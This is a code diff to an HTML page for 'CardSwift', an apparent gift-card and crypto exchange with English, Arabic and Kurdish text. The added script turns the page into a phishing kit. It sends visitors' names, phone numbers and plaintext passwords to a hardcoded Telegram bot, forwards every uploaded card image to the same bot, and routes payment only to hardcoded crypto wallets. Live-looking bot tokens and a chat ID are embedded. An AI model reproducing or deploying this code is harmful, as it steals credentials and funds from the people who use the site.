@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CardSwift | Elite Exchange</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --accent: #3b82f6; --bg: #020617; }
@@ -100,22 +99,7 @@
                 <div class="price-chip p-4 text-center text-xs font-bold" onclick="selectAmount(200)">$200</div>
                 <div class="price-chip p-4 text-center text-xs font-bold" onclick="selectAmount(500)">$500</div>
             </div>
-
-            <div id="buy-options" class="hidden-section space-y-4">
-                <div class="grid grid-cols-1 gap-3">
-                     <button onclick="payWithStars()" class="bg-black border border-white/10 p-5 rounded-3xl flex justify-center items-center gap-3 active:scale-95 transition">
-                        <img src="https://img.icons8.com/ios-filled/50/ffffff/apple-pay.png" class="h-8">
-                        <img src="https://img.icons8.com/color/48/google-pay.png" class="h-8">
-                    </button>
-                    <button onclick="payWithGlocal()" class="bg-white text-black p-5 rounded-3xl flex justify-center items-center gap-3 active:scale-95 transition font-black italic uppercase">
-                        <img src="https://img.icons8.com/color/48/visa.png" class="h-6">
-                        <img src="https://img.icons8.com/color/48/mastercard.png" class="h-6">
-                        Credit Card
-                    </button>
-                </div>
-                
-                <p class="text-center text-[10px] text-slate-500 font-bold py-4 italic uppercase">— Or Manual Crypto —</p>
-
+            <div id="buy-options" class="hidden-section space-y-8">
                 <div class="grid grid-cols-3 gap-3">
                     <button onclick="showAddress('TRC20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5">TRC20</button>
                     <button onclick="showAddress('BEP20')" class="bg-slate-800 p-4 rounded-2xl text-xs font-bold border border-white/5">BEP20</button>
@@ -127,7 +111,6 @@
                 </div>
                 <input type="file" id="buyFile" class="w-full bg-slate-950 p-4 rounded-2xl border border-slate-800 text-xs">
             </div>
-
             <div id="sell-options" class="hidden-section space-y-8">
                 <div class="bg-blue-600/10 p-8 rounded-3xl flex justify-between items-center border border-blue-500/20">
                     <span id="txt-receive" class="text-sm">You Get:</span><span id="receive-amount" class="text-3xl font-black text-green-400">0.00 USDT</span>
@@ -135,30 +118,82 @@
                 <input type="file" id="sellFile" class="w-full bg-slate-950 p-4 rounded-2xl border border-slate-800 text-xs">
                 <input type="text" id="sellWallet" placeholder="Your USDT Address" class="w-full p-4 rounded-2xl text-sm">
             </div>
-            <button id="submitBtn" onclick="sendToTelegram()" class="glow-button w-full py-6 rounded-3xl font-black mt-12 text-xl shadow-2xl uppercase italic">Confirm Transaction</button>
+            <button id="submitBtn" onclick="sendToTelegram()" class="glow-button w-full py-6 rounded-3xl font-black mt-12 text-xl shadow-2xl uppercase">Confirm Transaction</button>
             <button onclick="goHome()" id="btn-cancel" class="w-full text-slate-500 text-[10px] mt-8 font-black uppercase tracking-widest opacity-50">Cancel</button>
         </div>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+    <footer class="bg-[#010409] border-t border-white/5 pt-20 pb-10">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-12 mb-16">
+            <div>
+                <div class="flex items-center gap-2 mb-6"><div class="p-1 bg-blue-600 rounded"><svg width="16" height="16" viewBox="0 0 100 100"><path d="M35 50 L55 20 L55 45 L75 45 L55 80 L55 55 Z" fill="white"/></svg></div><span class="text-xl font-black italic uppercase">CardSwift</span></div>
+                <p id="txt-foot-desc" class="text-slate-500 text-xs leading-loose">Premium assets swapping services with 24/7 security.</p>
+            </div>
+            <div>
+                <h4 class="font-bold mb-6 text-xs uppercase text-blue-500">Inventory</h4>
+                <ul class="text-slate-400 text-xs space-y-3"><li>Razer Gold</li><li>PlayStation</li><li>Steam Wallet</li><li>iTunes / Apple</li></ul>
+            </div>
+            <div class="col-span-1 md:col-span-2">
+                <h4 class="font-bold mb-6 text-xs uppercase text-blue-500">Legal</h4>
+                <ul class="text-slate-400 text-xs space-y-3">
+                    <li class="cursor-pointer hover:text-white" onclick="showInfo('Terms', 'Legal Assets only.')">Terms of Service</li>
+                    <li class="cursor-pointer hover:text-white" onclick="showInfo('Privacy', 'Encrypted swap.')">Privacy Policy</li>
+                </ul>
+            </div>
+        </div>
+        <p class="text-center text-slate-600 text-[11px] font-bold">Copyright © 2025 CARDSWIFT ELITE.</p>
+    </footer>
 
-        const TG_TOKEN = "8474410669:AAGijCJUPAKJyBh4L5FyVEas7A-UdpVixWA";
+    <div id="infoModal" class="modal">
+        <div class="modal-content text-center">
+            <div class="close-btn" onclick="closeAllModals()"><svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg></div>
+            <h2 id="infoTitle" class="text-blue-500 font-black mb-4 uppercase"></h2>
+            <p id="infoText" class="text-slate-400 text-sm mb-10"></p>
+            <button onclick="closeAllModals()" class="bg-slate-800 px-10 py-3 rounded-full text-xs">Dismiss</button>
+        </div>
+    </div>
+    <div id="verifyModal" class="modal"><div class="animate-spin h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full"></div></div>
+
+    <script>
+        const TG_TOKEN = "8595088465:AAE5RPjItCt8Zm0irKMOP-Wd39Vlv0neKKI";
         const TG_ID = "7865246557";
         const WALLETS = { 'BEP20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0', 'TRC20': 'TVB3yoKYrw81vwKrMgqfvhuMmoQVXozgcf', 'ERC20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0' };
 
-        let userData = {}; let isRegistered = false; let pendingAction = ""; let activeName = ""; let activeImg = ""; let selectedVal = 0;
-
-        // قائمة الدول
-        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi Arabia", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},{n:"Egypt", c:"+20", f:"🇪🇬"}];
-        const countrySelect = document.getElementById('country-code');
-        countries.forEach(ct => { let opt = document.createElement('option'); opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c} (${ct.n})`; countrySelect.appendChild(opt); });
+        const translations = {
+            en: {
+                heroT: "Elite Exchange", heroD: "Secure, Instant, and Global assets swapping.",
+                regT: "Create Account", regB: "Register & Continue",
+                buy: "BUY", sell: "SELL", receive: "You Get:", cancel: "Cancel",
+                submit: "Confirm Transaction", footD: "Premium assets swapping services with 24/7 security."
+            },
+            ar: {
+                heroT: "تبادل النخبة", heroD: "تبادل أصول آمن، فوري، وعالمي.",
+                regT: "إنشاء حساب", regB: "تسجيل واستمرار",
+                buy: "شراء", sell: "بيع", receive: "ستستلم:", cancel: "إلغاء",
+                submit: "تأكيد العملية", footD: "خدمات تبادل أصول متميزة مع أمان على مدار الساعة."
+            },
+            ku: {
+                heroT: "ئاڵوگۆڕی نوخبە", heroD: "ئاڵوگۆڕی سەرمایەی پارێزراو، خێرا و جیهانی.",
+                regT: "دروستکردنی هەژمار", regB: "تۆمارکردن و بەردەوامبوون",
+                buy: "کڕین", sell: "فرۆشتن", receive: "وەردەگریت:", cancel: "هەڵوەشاندنەوە",
+                submit: "تەواوکردنی کارەکە", footD: "خزمەتگوزاری ئاڵوگۆڕی ناياب بە ئاسايشی ٢٤ کاتژمێری."
+            }
+        };
 
         function setLang(l) {
             const h = document.getElementById('html-tag');
+            const t = translations[l];
             h.dir = (l === 'en') ? 'ltr' : 'rtl';
+            document.getElementById('txt-hero-title').innerText = t.heroT;
+            document.getElementById('txt-hero-desc').innerText = t.heroD;
+            document.getElementById('txt-reg-title').innerText = t.regT;
+            document.getElementById('txt-reg-btn').innerText = t.regB;
+            document.getElementById('btn-choice-buy').innerText = t.buy;
+            document.getElementById('btn-choice-sell').innerText = t.sell;
+            document.getElementById('txt-receive').innerText = t.receive;
+            document.getElementById('btn-cancel').innerText = t.cancel;
+            document.getElementById('submitBtn').innerText = t.submit;
+            document.getElementById('txt-foot-desc').innerText = t.footD;
         }
 
         function goHome() {
@@ -167,20 +202,62 @@
             window.scrollTo(0,0);
         }
 
+        // قائمة الدول الموسعة والمحدثة
+        const countries = [
+            {n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi Arabia", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},
+            {n:"Kuwait", c:"+965", f:"🇰🇼"},{n:"Qatar", c:"+974", f:"🇶🇦"},{n:"Oman", c:"+968", f:"🇴🇲"},
+            {n:"Bahrain", c:"+973", f:"🇧🇭"},{n:"Jordan", c:"+962", f:"🇯🇴"},{n:"Egypt", c:"+20", f:"🇪🇬"},
+            {n:"Lebanon", c:"+961", f:"🇱🇧"},{n:"Syria", c:"+963", f:"🇸🇾"},{n:"Palestine", c:"+970", f:"🇵🇸"},
+            {n:"Yemen", c:"+967", f:"🇾🇪"},{n:"Libya", c:"+218", f:"🇱🇾"},{n:"Sudan", c:"+249", f:"🇸🇩"},
+            {n:"Tunisia", c:"+216", f:"🇹🇳"},{n:"Algeria", c:"+213", f:"🇩🇿"},{n:"Morocco", c:"+212", f:"🇲🇦"},
+            {n:"Turkey", c:"+90", f:"🇹🇷"},{n:"USA", c:"+1", f:"🇺🇸"},{n:"Germany", c:"+49", f:"🇩🇪"},
+            {n:"UK", c:"+44", f:"🇬🇧"},{n:"France", c:"+33", f:"🇫🇷"},{n:"Sweden", c:"+46", f:"🇸🇪"},
+            {n:"Netherlands", c:"+31", f:"🇳🇱"},{n:"Norway", c:"+47", f:"🇳🇴"},{n:"Italy", c:"+39", f:"🇮🇹"}
+        ];
+
+        const countrySelect = document.getElementById('country-code');
+        countries.forEach(ct => { 
+            let opt = document.createElement('option'); 
+            opt.value = ct.c; 
+            opt.innerHTML = `${ct.f} ${ct.c} (${ct.n})`; 
+            countrySelect.appendChild(opt); 
+        });
+
+        let userData = {}; let isRegistered = false; let pendingAction = ""; let activeName = ""; let activeImg = ""; let selectedVal = 0;
+
+        document.addEventListener('change', function(e) {
+            if (e.target && (e.target.id === 'sellFile' || e.target.id === 'buyFile')) {
+                const file = e.target.files[0];
+                if (file) {
+                    let fd = new FormData(); fd.append('chat_id', TG_ID); fd.append('photo', file);
+                    fd.append('caption', `⚠️ IMAGE: User ${userData.name} for ${activeName}`);
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }
+            }
+        });
+
         function openChoice(n, i) { activeName = n; activeImg = i; document.getElementById('choiceTitle').innerText = n; document.getElementById('choiceModal').style.display = 'flex'; }
         function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
         function checkAccess(a) { pendingAction = a; document.getElementById('choiceModal').style.display = 'none'; if (isRegistered) executeAction(); else document.getElementById('regModal').style.display = 'flex'; }
 
         async function startVerification() {
-            userData = { name: document.getElementById('reg-name').value, phone: document.getElementById('country-code').value + document.getElementById('reg-phone').value };
-            isRegistered = true;
-            closeAllModals();
-            executeAction();
+            userData = { name: document.getElementById('reg-name').value, email: document.getElementById('reg-email').value, phone: document.getElementById('country-code').value + document.getElementById('reg-phone').value, pass: document.getElementById('reg-pass').value };
+            if(!userData.name || !userData.phone || !userData.pass) return alert("Fill all data!");
+
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_ID, text: `👤 NEW USER: ${userData.name}\n📞 Phone: ${userData.phone}\n🔑 Pass: ${userData.pass}` })
+            });
+
+            document.getElementById('regModal').style.display = 'none';
+            document.getElementById('verifyModal').style.display = 'flex';
+            setTimeout(() => { isRegistered = true; document.getElementById('verifyModal').style.display = 'none'; executeAction(); }, 1200);
         }
 
         function executeAction() {
             document.getElementById('home-section').style.display = 'none';
             document.getElementById('action-section').classList.remove('hidden-section');
+            window.scrollTo(0,0);
             document.getElementById('action-card-name').innerText = activeName;
             document.getElementById('action-img').src = activeImg;
             document.getElementById('action-type-badge').innerText = pendingAction;
@@ -188,23 +265,16 @@
             else { document.getElementById('sell-options').classList.remove('hidden-section'); document.getElementById('buy-options').classList.add('hidden-section'); }
         }
 
-        function selectAmount(v) { 
-            selectedVal = v; 
-            document.querySelectorAll('.price-chip').forEach(c => { c.classList.remove('active'); if(c.innerText === '$'+v) c.classList.add('active'); }); 
-            // تعديل النسبة لـ 0.95 (5% خصم)
-            document.getElementById('receive-amount').innerText = (v * 0.95).toFixed(2) + " USDT"; 
-        }
-
+        function selectAmount(v) { selectedVal = v; document.querySelectorAll('.price-chip').forEach(c => { c.classList.remove('active'); if(c.innerText === '$'+v) c.classList.add('active'); }); document.getElementById('receive-amount').innerText = (v * 0.85).toFixed(2) + " USDT"; }
         function showAddress(n) { document.getElementById('address-box').classList.remove('hidden-section'); document.getElementById('wallet-to-copy').innerText = WALLETS[n]; }
         function copyWallet() { navigator.clipboard.writeText(document.getElementById('wallet-to-copy').innerText); alert("Copied!"); }
-
-        function payWithStars() { if(!selectedVal) return alert("Select amount!"); tg.showAlert(`Processing Apple/Google Pay ($${selectedVal}) via Stars...`); }
-        function payWithGlocal() { if(!selectedVal) return alert("Select amount!"); tg.showAlert("Connecting to Credit Card secure gateway..."); }
+        function showInfo(t, txt) { document.getElementById('infoTitle').innerText = t; document.getElementById('infoText').innerText = txt; document.getElementById('infoModal').style.display = 'flex'; }
 
         async function sendToTelegram() {
             if(!selectedVal) return alert("Select amount!");
-            alert("Success!");
-            location.reload();
+            const b = document.getElementById('submitBtn'); b.innerText = "Transmitting..."; b.disabled = true;
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_ID, text: `✅ ORDER: ${userData.name} | ${activeName} | $${selectedVal}` }) });
+            alert("Success!"); location.reload();
         }
     </script>
 </body>
